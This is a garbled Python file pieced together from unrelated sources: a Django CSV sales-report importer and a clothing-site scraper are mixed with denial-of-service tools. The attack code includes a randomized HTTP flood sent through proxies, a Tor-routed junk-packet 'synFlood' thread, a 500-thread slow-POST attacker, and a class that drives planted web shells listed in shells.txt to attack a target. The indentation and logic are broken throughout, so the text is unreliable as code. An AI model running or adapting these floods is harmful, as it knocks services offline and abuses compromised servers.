        keyword_top.append('omegle')
        keyword_top.append('comment')
        keyword_top.append('tips lose weight')
        keyword_top.append('account')
        keyword_top.append('health')
        keyword_top.append('business')
        keyword_top.append('free photography stock')
        keyword_top.append('110')
	keyword_top.append('vietnam')
	keyword_top.append('singapore')	
        keyword_top.append('all 150')
	return(keyword_top)
	
#builds random asscii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)
									
def httpcall(url):
        useragent_list()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        #request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Referer', random.choice(headers_referers)+random.choice(keyword_top))
        #request.add_header('Referer', host)
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        index = random.randint(0,len(listaproxy)-1)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==500): code=0
        except urllib2.HTTPError, e:
                        set_flag(1)
                        #print 'Response Code 500'
                        code=500
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)

def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})

def data_exist_eerr(request, pk):
    consulta = EERR.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_pp_vs_zn(request, pk):
    consulta = PrecioPromedio.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_precio_desc(request, pk):
    consulta = Descuento.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_unit(request, pk):
    consulta = Gasto.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_formula_ingreso(request, pk):
    consulta = VentaCompleta.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def transformarKilos(kilos):
    return kilos.replace('KG', '').replace('.', '').replace(',', '.')

def transformarKilosSinKG(kilos):
    return kilos.replace('.', '').replace(',', '.')

def transformarNetos(netos):
    return netos.replace('.', '')

def transformarPrecios(netos):
    return netos.replace('CLP', '').replace('.', '')

def transformarPorcentajes(porcentajes):
    return porcentajes.replace('%', '').replace(',', '.')						
 
#http request
def httpcall(url):
        useragent_list()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner = "&"
        else:
                param_joiner = "?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers)+random.choice(keyword_top))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==1000000000): code=1000000000
        except urllib2.HTTPError, e:
                        set_flag(1)
                        code=1000000000
                        time.sleep(6)
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)
        #print 'size: '+str(len(ips))+'\n'
        index = random.randint(0,len(ips)-1)
        #print 'http:'+ips[index];
        proxy = urllib2.ProxyHandler({'http':ips[index]})#proxy = urllib2.ProxyHandler({'http':random.choice(ips)})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==500): code=0
        except urllib2.HTTPError, e:
                        #print e.code
                        set_flag(1)
                        print 'Response Code 500'
                        code=500
                        #print "Start : %s" % time.ctime()
                        time.sleep(60)
                        #print "End : %s" % time.ctime()
        except urllib2.URLError, e:
#print e.reason
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)	
						
						
def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
        """setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
        Sets a default proxy which all further socksocket objects will use,
        unless explicitly changed.
        """
        global _defaultproxy
        _defaultproxy = (proxytype,addr,port,rdns,username,password)
       
class socksocket(socket.socket):
        """socksocket([family[, type[, proto]]]) -> socket object
       
        Open a SOCKS enabled socket. The parameters are the same as
        those of the standard socket init. In order for SOCKS to work,
        you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
        """
       
def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
                _orgsocket.__init__(self,family,type,proto,_sock)
                if _defaultproxy != None:
                        self.__proxy = _defaultproxy
                else:
                        self.__proxy = (None, None, None, None, None, None)
                self.__proxysockname = None
                self.__proxypeername = None
       
def __recvall(self, bytes):
                """__recvall(bytes) -> data
                Receive EXACTLY the number of bytes requested from the socket.
                Blocks until the required number of bytes have been received.
                """
                data = ""
                while len(data) < bytes:
                        data = data + self.recv(bytes-len(data))
                return data
       
def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
                """setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
                Sets the proxy to be used.
                proxytype -     The type of the proxy to be used. Three types
                                are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                                PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
                addr -          The address of the server (IP or DNS).
                port -          The port of the server. Defaults to 1080 for SOCKS
                                servers and 8080 for HTTP proxy servers.
                rdns -          Should DNS queries be preformed on the remote side
                                (rather than the local side). The default is True.
                                Note: This has no effect with SOCKS4 servers.
                username -      Username to authenticate with to the server.
                                The default is no authentication.
                password -      Password to authenticate with to the server.
                                Only relevant when username is also provided.
                """
                self.__proxy = (proxytype,addr,port,rdns,username,password)
       
def __negotiatesocks5(self,destaddr,destport):
                """__negotiatesocks5(self,destaddr,destport)
                Negotiates a connection through a SOCKS5 server.
                """
                # First we'll send the authentication packages we support.
                if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
                        # The username/password details were supplied to the
                        # setproxy method so we support the USERNAME/PASSWORD
                        # authentication (in addition to the standard none).
                        self.sendall("\x05\x02\x00\x02")
                else:
                        # No username/password were entered, therefore we
                        # only support connections with no authentication.
                        self.sendall("\x05\x01\x00")
                # We'll receive the server's response to determine which
                # method was selected
                chosenauth = self.__recvall(2)
                if chosenauth[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                # Check the chosen authentication method
                if chosenauth[1] == "\x00":
                        # No authentication is required
                        pass
                elif chosenauth[1] == "\x02":
                        # Okay, we need to perform a basic username/password
                        # authentication.
                        self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
                        authstat = self.__recvall(2)
                        if authstat[0] != "\x01":
                                # Bad response
                                self.close()
                                raise GeneralProxyError((1,_generalerrors[1]))
                        if authstat[1] != "\x00":
                                # Authentication failed
                                self.close()
                                raise Socks5AuthError,((3,_socks5autherrors[3]))
                        # Authentication succeeded
                else:
                        # Reaching here is always bad
                        self.close()
                        if chosenauth[1] == "\xFF":
                                raise Socks5AuthError((2,_socks5autherrors[2]))
                        else:
                                raise GeneralProxyError((1,_generalerrors[1]))
                # Now we can request the actual connection
                req = "\x05\x01\x00"
                # If the given destination address is an IP address, we'll
                # use the IPv4 address request even if remote resolving was specified.
                try:
                        ipaddr = socket.inet_aton(destaddr)
                        req = req + "\x01" + ipaddr
                except socket.error:
                        # Well it's not an IP number,  so it's probably a DNS name.
                        if self.__proxy[3]==True:
                                # Resolve remotely
                                ipaddr = None
                                req = req + "\x03" + chr(len(destaddr)) + destaddr
                        else:
                                # Resolve locally
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                                req = req + "\x01" + ipaddr
                req = req + struct.pack(">H",destport)
                self.sendall(req)
                # Get the response
                resp = self.__recvall(4)
                if resp[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                elif resp[1] != "\x00":
                        # Connection failed
                        self.close()
                        if ord(resp[1])<=8:
                                raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
                        else:
                                raise Socks5Error(9,_generalerrors[9])
                # Get the bound address/port
                elif resp[3] == "\x01":
                        boundaddr = self.__recvall(4)
                elif resp[3] == "\x03":
                        resp = resp + self.recv(1)
                        boundaddr = self.__recvall(resp[4])
                else:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                boundport = struct.unpack(">H",self.__recvall(2))[0]
                self.__proxysockname = (boundaddr,boundport)
                if ipaddr != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def getproxysockname(self):
                """getsockname() -> address info
                Returns the bound IP address and port number at the proxy.
                """
                return self.__proxysockname
       
def getproxypeername(self):
                """getproxypeername() -> address info
                Returns the IP and port number of the proxy.
                """
                return _orgsocket.getpeername(self)
       
def getpeername(self):
                """getpeername() -> address info
                Returns the IP address and port number of the destination
                machine (note: getproxypeername returns the proxy)
                """
                return self.__proxypeername
       
def __negotiatesocks4(self,destaddr,destport):
                """__negotiatesocks4(self,destaddr,destport)
                Negotiates a connection through a SOCKS4 server.
                """
                # Check if the destination address provided is an IP address
                rmtrslv = False
                try:
                        ipaddr = socket.inet_aton(destaddr)
                except socket.error:
                        # It's a DNS name. Check where it should be resolved.
                        if self.__proxy[3]==True:
                                ipaddr = "\x00\x00\x00\x01"
                                rmtrslv = True
                        else:
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                # Construct the request packet
                req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
                # The username parameter is considered userid for SOCKS4
                if self.__proxy[4] != None:
                        req = req + self.__proxy[4]
                req = req + "\x00"
                # DNS name if remote resolving is required
                # NOTE: This is actually an extension to the SOCKS4 protocol
                # called SOCKS4A and may not be supported in all cases.
                if rmtrslv==True:
                        req = req + destaddr + "\x00"
                self.sendall(req)
                # Get the response from the server
                resp = self.__recvall(8)
                if resp[0] != "\x00":
                        # Bad data
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if resp[1] != "\x5A":
                        # Server returned an error
                        self.close()
                        if ord(resp[1]) in (91,92,93):
                                self.close()
                                raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
                        else:
                                raise Socks4Error((94,_socks4errors[4]))
                # Get the bound address/port
                self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
                if rmtrslv != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def __negotiatehttp(self,destaddr,destport):
                """__negotiatehttp(self,destaddr,destport)
                Negotiates a connection through an HTTP server.
                """
                # If we need to resolve locally, we do this now
                if self.__proxy[3] == False:
                        addr = socket.gethostbyname(destaddr)
                else:
                        addr = destaddr
                self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
                # We read the response until we get the string "\r\n\r\n"
                resp = self.recv(1)
                while resp.find("\r\n\r\n")==-1:
                        resp = resp + self.recv(1)
                # We just need the first line to check if the connection
                # was successful
                statusline = resp.splitlines()[0].split(" ",2)
                if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                try:
                        statuscode = int(statusline[1])
                except ValueError:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if statuscode != 200:
                        self.close()
                        raise HTTPError((statuscode,statusline[2]))
                self.__proxysockname = ("0.0.0.0",0)
                self.__proxypeername = (addr,destport)
       
def connect(self,destpair):
                """connect(self,despair)
                Connects to the specified destination through a proxy.
                destpar - A tuple of the IP/DNS address and the port number.
                (identical to socket's connect).
                To select the proxy server use setproxy().
                """
                # Do a minimal input check first
                if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
                        raise GeneralProxyError((5,_generalerrors[5]))
                if self.__proxy[0] == PROXY_TYPE_SOCKS5:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks5(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks4(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_HTTP:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 8080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatehttp(destpair[0],destpair[1])
                elif self.__proxy[0] == None:
                        _orgsocket.connect(self,(destpair[0],destpair[1]))
                else:
                        raise GeneralProxyError((4,_generalerrors[4]))	
			
class ProxyError(Exception):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class GeneralProxyError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5AuthError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks4Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class HTTPError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)	
											
class synFlood(threading.Thread):
    def __init__(self, host, port):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_get(self, pause = random.randrange(1, 10)):
        global stop_now
        self.socks.send("GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: image/png,*/*;q=0.5\r\n"
                        "Cache-Control: no-cache, max-age=0\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 120\r\n"
                        "Content-Length: 42\r\n"
                        #"Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
            packet = random.choice(data)
            magic = random.choice(packet+p)
            print term.BOL+term.UP+term.CLEAR_EOL+"Sending magic packets!: %s" % packet+term.NORMAL
            self.socks.send(magic)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Stressing Target!..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    #self.socks = socks.socksocket()
                    continue
       
            while self.running:
                try:
                    self._send_http_get()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        #self.socks.close()
                        self.socks = socks.socksocket()
                        break
                    time.sleep(1)
                    pass
				     			
class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 6000
            file = 'index.php'
 
            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 900\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))
 
            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'
 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
            try:
                s.connect((server, 80))
                s.send(request)
 
                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    time.sleep(60)
                s.close()
                #s.recv(50000)
            except:
                print "Is It Dead Yet?"
 
def da_delegator(SITE,DOS_TYPE):
    thread_count = 500
    print '=' * 60
    print 'POST-it v1.1.0'.center(60,'-')
    print '=' * 60
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print 'start - %s' % thr1
        thr1.start()
        threads.append(thr1)
        #thr1.join()
 
    while len(threads) > 0:
            try:
                # Join all threads using a timeout so it doesn't block
                # Filter out threads which have been joined or are None
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print "Ctrl-c received! Sending kill to threads... Just Kill The Terminal" # Need to fix this!!!
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)					
					
class DenialOfService:
        def __init__(self):
                self.Settings = {      
                        'ip': '',
                        'port': 80,
                        'time': 50
                }
                self.IP, self.Port, self.Time = self.Settings['ip'], self.Settings['port'], str(self.Settings['time'])
               
                self.Shells = [i.strip() for i in open('shells.txt','r')]
                for (Shell) in izip(self.Shells):
                        Shell = ''.join(Shell)
                        self.Shell = str(Shell).strip("'")
                        try:
                                print '''Shell loaded: ''' + self.Shell
                                threading.Thread(target=self.Dos,args=()).start()
                        except:
                                pass
        def Dos(self):
                try:
                        while 1:
                                if '?' not in self.Shell:
                                        Data = self.Shell + '?act=phptools&host=' + self.IP + '&time=' + self.Time
                                        Request = urllib2.urlopen(Data).read()
                                else: pass
                except: print 'Dead shell: ' + self.Shell	

class PyGroupTalk:
 
    def __init__(self,port=8767,
    host="74.50.98.2",
    nickName="Ethoxyethaan5",
    client="TeamSpeak",
    loginName=None,
    operatingSystem="Windows XP",
    autoNick=True,
    anonymous=True,
    password=None):
        self.port           =port
        self.host           =host
        self.nickName       =nickName
        self.loginName      =loginName
        self.operatingSystem=operatingSystem
        self.autoNick       =autoNick
        self.anonymous      =anonymous
        self.password       =password
        self.client         =client
 
        self.__nick    = self.__FormatText(29,self.nickName)
        self.__login   = self.__FormatText(29,self.loginName)
        self.__password= self.__FormatText(29,self.password)
        self.__client  = self.__FormatText(29,self.client)
        self.__OS      = self.__FormatText(29,self.operatingSystem)
        self.__autonNick = "\x01" if self.autoNick else "\x00"
        self.__registered_login = "\x01" if self.anonymous else "\x02"
 
        self.__s_packet = ""
        self.__get=""
       
        self.__socket = None
 
        self.__client_id = "\0"*4
        self.__session_key = "\x00\x00\x00\x00"
        self.__sequence_number = "\x01\x00\x00\x00"
 
        self.__crc_offset=int(0)
 
        self.__resend="\x00\x00"
        self.__ping_sequ="\x02\x00\x00\x00"
 
        self.lasterror=time.time()
 
    def __FormatText(self,s,n):
        return (chr(len(n))+n+((s-len(n))*"\0")) if n <> None else 30*"\0"
        #value_when_true if condition else value_when_false
 
    def __Format_Left(self,lengt,string):
        ""
 
    def __CrcMirror(self,A):
        A=A&0xFFFFFFFF
        A = (A>>(8*3))+((A&0x00FF0000)>>8)+((A&0x0000FF00)<<8)+((A&0x000000FF)<<(8*3))
        return A
 
    def __CrcMirrorChar(self,A):
        A=self.__CrcMirror(A)
        A=chr(A>>8*3)+chr((A&0x00FF0000)>>8*2)+chr((A&0x0000FF00)>>8)+chr((A&0x000000FF))
        return A
 
    #responce creation
 
    def __Set_Class_Connection(self):
        self.__s_packet = "\xf4\xbe"
 
    def __Set_Class_Standard(self):
        self.__s_packet="\xf0\xbe"
 
    def __Set_Class_Ack(self):
        self.__s_packet="\xf1\xbe"
 
    def __Set_Type_Login_Request(self):
        self.__s_packet=self.__s_packet + "\x03\x00"
 
    def __Set_Type_Login_Request_Part_2(self):
        self.__s_packet=self.__s_packet + "\x05\x00"
 
    def __Set_Type_Ping(self):
        self.__s_packet=self.__s_packet+"\x01\0"
 
    def __Set_Client_Id(self):
        self.__s_packet=self.__s_packet+self.__client_id
 
    def __Set_Sequence_Number(self):
        self.__s_packet=self.__s_packet+self.__sequence_number
 
    def __Set_Ping_Sequence_number(self):
        self.__s_packet=self.__s_packet+self.__ping_sequ
 
    def __Set_Session_Key(self):
        self.__s_packet=self.__s_packet+self.__session_key
 
    def __Set_Host(self):
        a=chr(int(self.host.split(".")[0]))
        b=chr(int(self.host.split(".")[1]))
        c=chr(int(self.host.split(".")[2]))
        d=chr(int(self.host.split(".")[3]))
        #print (a+b+c+d).encode("hex")
        self.__s_packet=self.__s_packet+a+b+c+d
 
    def __Set_Port(self):
        self.__s_packet=self.__s_packet+(chr(int(self.port/0x100))+chr(int(self.port-int(self.port/0x100)*0x100)))
       
    def __Set_Crc_Empty(self):
        self.__crc_offset=len(self.__s_packet)
        self.__s_packet=self.__s_packet+"\0"*4
 
    def __Set_Crc_Packet(self):
        self.__s_packet=self.__s_packet[:self.__crc_offset]+self.__CrcMirrorChar(crc32(self.__s_packet))+self.__s_packet[self.__crc_offset+4:]
    #end responce creatio
 
    def Type_1_connect_login(self):
    #packet is 180 bytes big
        self.__s_packet=""                              #empty it
        self.__client_id = "\0"*4                         #reset it
        self.__session_key = "\x00\x00\x00\x00"         #reset it
        self.__sequence_number = "\x01\x00\x00\x00"     #reset it
 
        unknown_data="\x02\0\0\0\x20\0\x3c\0"
 
        self.__Set_Class_Connection()   #2 bytes
        self.__Set_Type_Login_Request() #2 bytes
        self.__Set_Client_Id()          #4 bytes.
        self.__Set_Session_Key()        #4 bytes
        self.__Set_Sequence_Number()    #4 bytes
        self.__Set_Crc_Empty()           #4 bytes
        self.__s_packet=self.__s_packet+self.__client
        self.__s_packet=self.__s_packet+self.__OS
        self.__s_packet=self.__s_packet+unknown_data
